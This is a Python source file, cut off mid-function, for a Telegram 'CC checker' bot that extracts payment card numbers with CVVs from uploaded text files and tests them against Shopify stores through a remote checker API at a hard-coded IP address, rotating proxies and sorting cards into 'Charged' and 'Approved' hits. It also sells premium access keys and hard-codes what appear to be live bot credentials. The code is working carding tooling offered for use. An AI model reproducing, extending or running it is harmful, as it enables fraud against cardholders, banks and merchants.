from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta

API_ID = 38807471
API_HASH = '9bbfb9efe1a47596cf7f1b20017f5dc6'
BOT_TOKEN = '8814431689:AAFdZVq3P9TZvM3eXXUCcaneSXohpXosWF0'
ADMIN_ID = [5541778617]
CHECKER_API_URL = 'http://85.90.216.140//shopify_parallel'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
PRICE_FILTERS_FILE = "price_filters.json"
SITES_WITH_PRICE_FILE = "sites_price.json"
KEYS_FILE = "keys.json"
HITS_CHANNEL_ID = 0

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}
TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}
COLLECT_DATA = {}
COLLECT_TIMERS = {}
MERGE_DATA = {}
MERGE_TIMERS = {}

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724", "😺": "5118590136149345664",
    "🌍": "5303440357428586778", "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865", "⚙️": "5258023599419171861",
    "⛔": "4918014360267260850", "📥": "5350747347724810871", "💵": "5350711759625795085",
    "️🏷️": "5436285465420383204", "📂": "5444908424015934570", "🛠️": "5348239232852836489",
    "📄️": "5323538339062628165"
}

FLAGS = {
    'AD': '🇦🇩', 'AE': '🇦🇪', 'AF': '🇦🇫', 'AG': '🇦🇬', 'AI': '🇦🇮', 'AL': '🇦🇱', 'AM': '🇦🇲', 'AO': '🇦🇴', 'AQ': '🇦🇶', 'AR': '🇦🇷', 'AS': '🇦🇸', 'AT': '🇦🇹', 'AU': '🇦🇺', 'AW': '🇦🇼', 'AX': '🇦🇽', 'AZ': '🇦🇿', 'BA': '🇧🇦', 'BB': '🇧🇧', 'BD': '🇧🇩', 'BE': '🇧🇪', 'BF': '🇧🇫', 'BG': '🇧🇬', 'BH': '🇧🇭', 'BI': '🇧🇮', 'BJ': '🇧🇯', 'BL': '🇧🇱', 'BM': '🇧🇲', 'BN': '🇧🇳', 'BO': '🇧🇴', 'BQ': '🇧🇶', 'BR': '🇧🇷', 'BS': '🇧🇸', 'BT': '🇧🇹', 'BV': '🇧🇻', 'BW': '🇧🇼', 'BY': '🇧🇾', 'BZ': '🇧🇿', 'CA': '🇨🇦', 'CC': '🇨🇨', 'CD': '🇨🇩', 'CF': '🇨🇫', 'CG': '🇨🇬', 'CH': '🇨🇭', 'CI': '🇨🇮', 'CK': '🇨🇰', 'CL': '🇨🇱', 'CM': '🇨🇲', 'CN': '🇨🇳', 'CO': '🇨🇴', 'CR': '🇨🇷', 'CU': '🇨🇺', 'CV': '🇨🇻', 'CW': '🇨🇼', 'CX': '🇨🇽', 'CY': '🇨🇾', 'CZ': '🇨🇿', 'DE': '🇩🇪', 'DJ': '🇩🇯', 'DK': '🇩🇰', 'DM': '🇩🇲', 'DO': '🇩🇴', 'DZ': '🇩🇿', 'EC': '🇪🇨', 'EE': '🇪🇪', 'EG': '🇪🇬', 'EH': '🇪🇭', 'ER': '🇪🇷', 'ES': '🇪🇸', 'ET': '🇪🇹', 'FI': '🇫🇮', 'FJ': '🇫🇯', 'FK': '🇫🇰', 'FM': '🇫🇲', 'FO': '🇫🇴', 'FR': '🇫🇷', 'GA': '🇬🇦', 'GB': '🇬🇧', 'GD': '🇬🇩', 'GE': '🇬🇪', 'GF': '🇬🇫', 'GG': '🇬🇬', 'GH': '🇬🇭', 'GI': '🇬🇮', 'GL': '🇬🇱', 'GM': '🇬🇲', 'GN': '🇬🇳', 'GP': '🇬🇵', 'GQ': '🇬🇶', 'GR': '🇬🇷', 'GS': '🇬🇸', 'GT': '🇬🇹', 'GU': '🇬🇺', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HK': '🇭🇰', 'HM': '🇭🇲', 'HN': '🇭🇳', 'HR': '🇭🇷', 'HT': '🇭🇹', 'HU': '🇭🇺', 'ID': '🇮🇩', 'IE': '🇮🇪', 'IL': '🇮🇱', 'IM': '🇮🇲', 'IN': '🇮🇳', 'IO': '🇮🇴', 'IQ': '🇮🇶', 'IR': '🇮🇷', 'IS': '🇮🇸', 'IT': '🇮🇹', 'JE': '🇯🇪', 'JM': '🇯🇲', 'JO': '🇯🇴', 'JP': '🇯🇵', 'KE': '🇰🇪', 'KG': '🇰🇬', 'KH': '🇰🇭', 'KI': '🇰🇮', 'KM': '🇰🇲', 'KN': '🇰🇳', 'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KY': '🇰🇾', 'KZ': '🇰🇿', 'LA': '🇱🇦', 'LB': '🇱🇧', 'LC': '🇱🇨', 'LI': '🇱🇮', 'LK': '🇱🇰', 'LR': '🇱🇷', 'LS': '🇱🇸', 'LT': '🇱🇹', 'LU': '🇱🇺', 'LV': '🇱🇻', 'LY': '🇱🇾', 'MA': '🇲🇦', 'MC': '🇲🇨', 'MD': '🇲🇩', 'ME': '🇲🇪', 'MF': '🇲🇫', 'MG': '🇲🇬', 'MH': '🇲🇭', 'MK': '🇲🇰', 'ML': '🇲🇱', 'MM': '🇲🇲', 'MN': '🇲🇳', 'MO': '🇲🇴', 'MP': '🇲🇵', 'MQ': '🇲🇶', 'MR': '🇲🇷', 'MS': '🇲🇸', 'MT': '🇲🇹', 'MU': '🇲🇺', 'MV': '🇲🇻', 'MW': '🇲🇼', 'MX': '🇲🇽', 'MY': '🇲🇾', 'MZ': '🇲🇿', 'NA': '🇳🇦', 'NC': '🇳🇨', 'NE': '🇳🇪', 'NF': '🇳🇫', 'NG': '🇳🇬', 'NI': '🇳🇮', 'NL': '🇳🇱', 'NO': '🇳🇴', 'NP': '🇳🇵', 'NR': '🇳🇷', 'NU': '🇳🇺', 'NZ': '🇳🇿', 'OM': '🇴🇲', 'PA': '🇵🇦', 'PE': '🇵🇪', 'PF': '🇵🇫', 'PG': '🇵🇬', 'PH': '🇵🇭', 'PK': '🇵🇰', 'PL': '🇵🇱', 'PM': '🇵🇲', 'PN': '🇵🇳', 'PR': '🇵🇷', 'PS': '🇵🇸', 'PT': '🇵🇹', 'PW': '🇵🇼', 'PY': '🇵🇾', 'QA': '🇶🇦', 'RE': '🇷🇪', 'RO': '🇷🇴', 'RS': '🇷🇸', 'RU': '🇷🇺', 'RW': '🇷🇼', 'SA': '🇸🇦', 'SB': '🇸🇧', 'SC': '🇸🇨', 'SD': '🇸🇩', 'SE': '🇸🇪', 'SG': '🇸🇬', 'SH': '🇸🇭', 'SI': '🇸🇮', 'SJ': '🇸🇯', 'SK': '🇸🇰', 'SL': '🇸🇱', 'SM': '🇸🇲', 'SN': '🇸🇳', 'SO': '🇸🇴', 'SR': '🇸🇷', 'SS': '🇸🇸', 'ST': '🇸🇹', 'SV': '🇸🇻', 'SX': '🇸🇽', 'SY': '🇸🇾', 'SZ': '🇸🇿', 'TC': '🇹🇨', 'TD': '🇹🇩', 'TF': '🇹🇫', 'TG': '🇹🇬', 'TH': '🇹🇭', 'TJ': '🇹🇯', 'TK': '🇹🇰', 'TL': '🇹🇱', 'TM': '🇹🇲', 'TN': '🇹🇳', 'TO': '🇹🇴', 'TR': '🇹🇷', 'TT': '🇹🇹', 'TV': '🇹🇻', 'TW': '🇹🇼', 'TZ': '🇹🇿', 'UA': '🇺🇦', 'UG': '🇺🇬', 'UM': '🇺🇲', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿', 'VA': '🇻🇦', 'VC': '🇻🇨', 'VE': '🇻🇪', 'VG': '🇻🇬', 'VI': '🇻🇮', 'VN': '🇻🇳', 'VU': '🇻🇺', 'WF': '🇼🇫', 'WS': '🇼🇸', 'XK': '🇽🇰', 'YE': '🇾🇪', 'YT': '🇾🇹', 'ZA': '🇿🇦', 'ZM': '🇿🇲', 'ZW': '🇿🇼'
}

def get_flag(code):
    return FLAGS.get(str(code).upper(), '◻️')
    
DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "Aʟʟ Sɪᴛᴇs", "min": 0, "max": 999999, "all": True}
]

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cᴍᴅ", b"show_cmds", style="primary", icon=4904936030232117798),
         Button.inline(" Tᴏᴏls", b"tools_menu", style="primary", icon=5361734213370396027)],
        [Button.url(" Cʜᴀɴɴᴇʟ", "https://t.me/nativecodes", style="success", icon=5445408306669582934)]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Aᴅᴍɪɴ Pᴀɴᴇʟ", b"admin_panel", style="success", icon=6266995104687330978)])
    return buttons

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for admin in ADMIN_ID:
                f.write(f"{admin}\n")
        return [str(admin) for admin in ADMIN_ID]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        for admin in ADMIN_ID:
            if str(admin) not in users:
                users.append(str(admin))
                with open(PREMIUM_USERS_FILE, 'w') as f:
                    for u in users:
                        f.write(f"{u}\n")
        return users
    except:
        return [str(admin) for admin in ADMIN_ID]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

async def add_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

async def remove_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) in premium_users:
        premium_users.remove(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

def generate_key():
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"PORIOT_{random_part}"

async def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=4)

async def load_price_filters():
    if not os.path.exists(PRICE_FILTERS_FILE):
        return {}
    try:
        with open(PRICE_FILTERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_price_filters(filters):
    with open(PRICE_FILTERS_FILE, 'w') as f:
        json.dump(filters, f, indent=4)

async def load_sites_with_price():
    if not os.path.exists(SITES_WITH_PRICE_FILE):
        return []
    try:
        with open(SITES_WITH_PRICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

async def save_sites_with_price(data):
    with open(SITES_WITH_PRICE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def get_price_from_response(raw_response):
    try:
        price = raw_response.get('Price', '-')
        if price != '-' and price != 0:
            try:
                price_clean = str(price).replace('$', '').replace(',', '').strip()
                return float(price_clean)
            except:
                return 0.0
        return 0.0
    except:
        return 0.0

def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return True
    if not gateway or gateway == "Unknown":
        return True
    if "Shopify" not in gateway:
        return True
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    
    response_lower = response_msg.lower()
    dead_keywords = [
        'receipt id is empty', 'handle is empty', 'product id is empty',
        'tax amount is empty', 'payment method identifier is empty',
        'invalid url', 'error in 1st req', 'error in 1 req',
        'cloudflare', 'connection failed', 'timed out',
        'access denied', 'tlsv1 alert', 'ssl routines',
        'could not resolve', 'domain name not found',
        'name or service not known', 'openssl ssl_connect',
        'empty reply from server', 'httperror504', 'http error',
        'timeout', 'unreachable', 'ssl error',
        '502', '503', '504', 'bad gateway', 'service unavailable',
        'gateway timeout', 'network error', 'connection reset',
        'failed to detect product', 'failed to create checkout',
        'failed to tokenize card', 'failed to get proposal data',
        'submit rejected', 'handle error', 'http 404',
        'delivery_delivery_line_detail_changed', 'delivery_address2_required',
        'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
        'site dead', 'captcha_required', 'captcha required',
        'site errors', 'failed', 'not supported', 'unsupported',
        'invalid site', 'connection refused', 'forbidden',
        'no response', 'host not found', 'domain not found',
        'could not connect', 'connection error', 'request timeout',
        'gateway error', 'internal server error', 'server error',
        'page not found', 'not found', 'http 500', 'http 502',
        'http 503', 'http 504', 'cloudflare error', 'cf-error',
        'cf-ray', 'challenge required', 'blocked', 'access blocked'
    ]
    
    for keyword in dead_keywords:
        if keyword in response_lower:
            return True
    
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def send_hit_to_channel(card, status, response, gateway, price):
    if HITS_CHANNEL_ID == 0:
        return
    try:
        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            status_text = premium_emoji("💎 Cʜᴀʀɢᴇᴅ")
            should_pin = True
        elif "APPROVED" in status.upper():
            status_text = premium_emoji("✅ Aᴘᴘʀᴏᴠᴇᴅ")
            should_pin = False
        else:
            status_text = premium_emoji(f"📌 {status}")
            should_pin = False
        now = datetime.now()
        time_str = now.strftime("%H:%M:%S")
        msg = premium_emoji(f"""{status_text}
🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
📝 {response[:45]}
⏱️ {time_str}
🍑 <a href='tg://user?id=8978049174'>Aꜰᴜᴏɴᴀ</a>""")
        sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
        if should_pin:
            try:
                await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
            except:
                pass
    except:
        pass

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        price_value = get_price_from_response(raw)
        if price != '-' and price != 0:
            price_display = f"${price}"
        else:
            price_display = '-'
        gateway = raw.get('Gateway', 'Shopify')
        if is_site_dead(response_msg, gateway, price_display):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        response_lower = response_msg.lower()
        if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        elif any(key in response_lower for key in ['approved', 'success', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 'otp', 'verification required', 'authenticate', 'authentication required', 'challenge required', 'redirecting to bank', 'bank verification', 'send code', 'enter code', 'verify']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def check_card_with_retry(card, sites, proxies, max_retries=20):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        if not result.get('retry'):
            return result
        if attempt < max_retries - 1:
            await asyncio.sleep(2)
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

async def send_realtime_hit(user_id, result, hit_type, username):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    if hit_type == "Charged":
        status_text = "CHARGED"
        emoji = "💎"
    else:
        status_text = "APPROVED"
        emoji = "✅"
    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}"""
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    total = results['total']
    checked = results['checked']
    remaining = total - checked
    
    percentage = int((checked / total) * 100) if total > 0 else 0
    
    bar_length = 16
    filled = int(bar_length * checked / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_length - filled)
    
    progress_text = f"""💳 Cᴀʀᴅ: <code>{results.get('last_card', 'None')[:16]}</code>
📝 {results.get('last_response', 'Waiting...')[:16]}
💰 {results.get('last_price', '-')[:7]}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
{bar}
❌ Dᴇᴄʟɪɴᴇᴅ: {len(results.get('dead', []))}
📊 {checked}/{total} ({percentage}%) | Rᴇᴍᴀɪɴɪɴɢ: {remaining}
⏱️ {hours:02d}:{minutes:02d}:{seconds:02d}
"""
    buttons = [
        [Button.inline(f" Cʜᴀʀɢᴇᴅ {len(results['charged'])}", f"shopify_export_charged:{user_id}".encode(), style="success", icon=5444987348334965906)],
        [Button.inline(f" Aᴘᴘʀᴏᴠᴇᴅ {len(results['approved'])}", f"shopify_export_approved:{user_id}".encode(), style="primary", icon=5343636681473935403)],
        [Button.inline(f" Eʀʀᴏʀs {len(results.get('errors', []))}", f"shopify_export_errors:{user_id}".encode(), style="danger", icon=4915853119839011973)],
        [Button.inline(" Sᴛᴏᴘ", f"stop_{user_id}".encode(), style="danger", icon=4915890090917495591)]
    ]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "Nᴏ ʜɪᴛs ғᴏᴜɴᴅ"
    errors_count = len(results.get('errors', []))
    
    summary = f"""✅ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ! ✅

📊 Rᴇsᴜʟᴛs:
   ┣ ✅ Cʜᴀʀɢᴇᴅ: {len(results['charged'])}
   ┣ 🔥 Aᴘᴘʀᴏᴠᴇᴅ: {len(results['approved'])}
   ┣ ❌ Dᴇᴄʟɪɴᴇᴅ: {len(results['dead'])}
   ┣ ⚠️ Eʀʀᴏʀs: {errors_count}
   ┗ 📊 Tᴏᴛᴀʟ: {results['total']}

Hɪᴛs:
{hits_text}

💡 Mᴀᴅᴇ ʙʏ Poriot_ke"""

    buttons = []
    if results['charged']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Cʜᴀʀɢᴇᴅ ({len(results['charged'])})", f"shopify_export_charged:{user_id}".encode(), style="success", icon=5343636681473935403)])
    if results['approved']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Aᴘᴘʀᴏᴠᴇᴅ ({len(results['approved'])})", f"shopify_export_approved:{user_id}".encode(), style="primary", icon=5123248930124989216)])
    if results.get('errors'):
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Eʀʀᴏʀs ({errors_count})", f"shopify_export_errors:{user_id}".encode(), style="danger", icon=4915853119839011973)])
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"afuonax{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"DECLINED ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"ERRORS ({len(results.get('errors', []))}):\n")
        for r in results.get('errors', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    
    await bot.send_message(user_id, premium_emoji(summary), file=filename, buttons=buttons if buttons else None, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

async def process_file_with_filters(event, user_id):
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ."), parse_mode='html')
            os.remove(file_path)
            return
        TEMP_FILE_DATA[user_id] = {'cards': cards, 'file_path': file_path}
        filters = await load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        buttons = []
        row = []
        for i, f in enumerate(gateway_filters):
            row.append(Button.inline(f["name"], f"price_fltr:{i}:{user_id}".encode(), style="primary", icon=5348503265967355284))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([Button.inline("  Cᴀɴᴄᴇʟ", b"cancel_filter", style="danger", icon=5447647474984449520)])
        await event.reply(
            premium_emoji(f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: {len(cards)} ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\n💰 Sᴇʟᴇᴄᴛ ᴀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ:"),
            buttons=buttons,
            parse_mode='html'
        )
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

async def start_mass_check(user_id, cards, sites, event):
    if not sites:
        await event.edit(premium_emoji("❌ Nᴏ sɪᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.edit(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!\n\n⚠️ Pʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ᴛᴏ ᴀᴅᴅ ᴘʀᴏxɪᴇsᴇ!"), parse_mode='html')
        return
    status_msg = await event.edit(premium_emoji(f"🔥 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ғᴏʀ {len(cards)} ᴄᴀʀᴅs..."), parse_mode='html')
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [], 'approved': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0,
        'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Unknown'
    }
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]
        async def worker():
